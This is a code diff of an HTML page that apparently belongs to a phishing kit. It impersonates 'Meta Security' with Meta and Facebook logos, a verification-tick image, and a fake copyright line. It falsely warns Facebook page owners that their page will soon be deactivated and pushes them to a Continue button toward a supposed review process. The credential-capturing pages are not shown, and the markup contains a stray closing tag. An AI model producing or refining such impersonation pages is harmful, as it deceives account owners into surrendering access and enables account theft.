@@ -1,102 +1,142 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Meta Security</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            text-align: center;
-            padding-top: 100px;
-            background-color: #f5f6f7;
-            margin: 0;
-        }
-        .container {
-            background-color: white;
-            display: inline-block;
-            padding: 40px;
-            border-radius: 8px;
-            box-shadow: 0 0 10px rgba(0,0,0,0.1);
-        }
-        img.logo {
-            width: 60px;
-        }
-        h1 {
-            font-size: 24px;
-            margin-top: 10px;
-        }
-        .warning {
-            color: red;
-            font-weight: bold;
-            margin: 20px 0;
-        }
-        p {
-            font-size: 16px;
-            line-height: 1.5;
-        }
-        .btn {
-            background-color: #1877f2;
-            color: white;
-            padding: 10px 20px;
-            font-size: 16px;
-            text-decoration: none;
-            border-radius: 5px;
-            display: inline-block;
-            margin-top: 20px;
-            cursor: pointer;
-        }
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Meta Security | Account Restriction</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: #f0f2f5;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
 
-        /* Facebook related links section */
-        .links {
-            margin-top: 30px;
-            font-size: 14px;
-            color: #555;
-        }
-        .links a {
-            color: #1877f2;
-            text-decoration: none;
-            margin: 0 10px;
-        }
-        .links a:hover {
-            text-decoration: underline;
-        }
+    .container {
+      background: white;
+      max-width: 400px;
+      margin-top: 60px;
+      padding: 20px;
+      border-radius: 10px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      text-align: center;
+      position: relative;
+    }
 
-        footer {
-            margin-top: 60px;
-            font-size: 14px;
-            color: #888;
-        }
-    </style>
+    .top-logo {
+      position: absolute;
+      top: -50px;
+      left: -50px;
+    }
+
+    .top-logo img {
+      width: 40px;
+    }
+
+    .meta-logo img {
+      width: 60px;
+      margin-bottom: 10px;
+    }
+
+    h2 {
+      margin: 10px 0;
+    }
+
+    h3 {
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      margin: 10px 0;
+    }
+
+    .blue-tick {
+      color: #1877f2; /* Facebook blue */
+      font-weight: bold;
+      font-size: 18px;
+      vertical-align: middle;
+    }
+
+    .warning {
+      color: red;
+      font-weight: bold;
+      margin: 15px 0;
+    }
+
+    .description {
+      color: #333;
+      font-size: 14px;
+      margin-bottom: 20px;
+    }
+
+    .btn {
+      padding: 10px 20px;
+      background-color: #1877f2;
+      color: white;
+      text-decoration: none;
+      border-radius: 6px;
+      font-weight: bold;
+      display: inline-block;
+    }
+
+    .footer-links {
+      margin-top: 20px;
+      font-size: 12px;
+      color: #555;
+    }
+
+    .footer-links a {
+      color: #1877f2;
+      text-decoration: none;
+      margin: 0 5px;
+    }
+
+    .footer {
+      margin-top: 40px;
+      font-size: 12px;
+      color: #888;
+    }
+  </style>
 </head>
 <body>
-    <div class="container">
-        <!-- Meta Logo -->
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/0c/Meta_Platforms_Logo.svg/2048px-Meta_Platforms_Logo.svg.png" alt="Meta Logo" class="logo">
-        
-        <h1>Meta Security</h1>
-        <h2>Account Restrictions Service</h2>
-        <p class="warning">Your Page Will Be Deactivated Soon</p>
-        <p>
-            We will walk you through several steps to request a review.<br>
-            You should complete these steps so that your page will not be deleted permanently.
-        </p>
 
-        <!-- Continue Button -->
-        <a href="request.html" class="btn">Continue</a>
+  <!-- Facebook Logo (top-left) -->
+  <div class="top-logo">
+    <img src="facebook-logo.png" alt="Facebook Logo" />
+  </div>
 
-        <!-- Facebook Related Links -->
-        <div class="links">
-            <a href="#">Terms of Service</a> |
-            <a href="#">Privacy Policy</a> |
-            <a href="#">Community Standards</a> |
-            <a href="#">Help Center</a>
-        </div>
+  <div class="container">
+    <!-- Meta Logo -->
+    <div class="meta-logo">
+      <img src="meta-logo.png" alt="Meta Logo" />
     </div>
 
-    <!-- Footer -->
-    <footer>
-        Meta Platforms, Inc. © 2025. All rights reserved.
-    </footer>
+    <h2>Meta Security</h2>
+    </h3>
+<h3>Account Restrictions Service</h3> <img src="https://cdn.glitch.global/d9a1111a-d0ad-4fa6-aeec-3c8aa027f796/bluetick.png?v=1737135548362" alt="">
+    <p class="warning">Your Page Will Be Deactivated Soon</p>
+
+    <p class="description">
+      We will walk you through several steps to request a review.<br />
+      You should complete these steps so that your page will not be deleted permanently.
+    </p>
+
+    <a href="#" class="btn">Continue</a>
+
+    <div class="footer-links">
+      <a href="#">Terms of Service</a> |
+      <a href="#">Privacy Policy</a> |
+      <a href="#">Community Standards</a> |
+      <a href="#">Help Center</a>
+    </div>
+
+    <div class="footer">
+      Meta Platforms, Inc. © 2025. All rights reserved.
+    </div>
+  </div>
+
 </body>
 </html>
